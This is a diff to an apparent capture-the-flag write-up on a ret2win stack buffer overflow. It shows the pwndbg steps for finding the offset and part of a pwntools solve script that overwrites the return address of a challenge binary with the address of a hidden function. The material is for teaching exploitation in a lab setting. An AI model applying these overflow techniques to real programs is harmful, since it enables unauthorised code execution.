@@ -22,7 +22,7 @@ We want to perform ret2win in this case.
 2. Find return address of `hiddenBlessing` address
 
 #### To find the offset needed:
-1. use `cyclic 200` in pwndbg (this generates the de bruijin sequence)
+1. use `cyclic 200` in pwndbg (this generates the de bruijn sequence)
 2. `break main` and run the program (C)
 3. you should see that the `RSP` pointer contains `raaaaaaa` and beyond. We just need the first 8 bytes because that is where the return address.
 
@@ -53,19 +53,16 @@ With that knowledge, we can put our solve script together!
 from pwn import *
 
 # local solve
-p = process("./kid_R2W_bin")
-context.binary = "./kid_R2W_bin"
+p = process("./chall")
 
-# remote solve
-# p = remote (server, port)
+# remote
+# p = remote("IP", PORT)
 
 # hiddenBlessing function
-win = p64(0x4006d7) + b'\n'
+win = p64(0x400797) + b'\n'
 
 # Choose option first to enlightenment function
-option = b'2\n'
-p.sendlineafter("purpose: \n", option)
-
+p.sendlineafter("purpose: \n", b'2')
 
 # send payload after sendting option
 payload = b'A' * 136  
